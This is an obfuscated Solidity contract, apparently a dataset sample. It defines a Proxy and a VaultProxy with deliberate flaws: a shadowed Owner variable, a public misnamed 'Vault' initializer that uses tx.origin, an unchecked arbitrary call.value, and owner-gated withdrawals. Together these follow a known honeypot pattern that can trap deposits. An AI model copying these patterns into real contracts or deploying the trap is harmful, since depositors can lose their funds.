// SPDX-License-Identifier: MIT
pragma solidity ^0.4.23;

contract Proxy  {
    modifier _0x0d9b60 { if (msg.sender == Owner) _; } address Owner = msg.sender;
    function _0x2f20a3(address _0x049810) public _0x0d9b60 { Owner = _0x049810; }
    function _0xba5c9c(address _0x15b10d, bytes data) public payable {
        _0x15b10d.call.value(msg.value)(data);
    }
}

contract VaultProxy is Proxy {
    address public Owner;
    mapping (address => uint256) public Deposits;

    function () public payable { }

    function Vault() public payable {
        if (msg.sender == tx.origin) {
            if (true) { Owner = msg.sender; }
            _0x2669e3();
        }
    }

    function _0x2669e3() public payable {
        if (msg.value > 0.25 ether) {
            Deposits[msg.sender] += msg.value;
        }
    }

    function _0x89e6f9(uint256 _0x354d8d) public _0x0d9b60 {
        if (_0x354d8d>0 && Deposits[msg.sender]>=_0x354d8d) {
            msg.sender.transfer(_0x354d8d);
        }
    }
}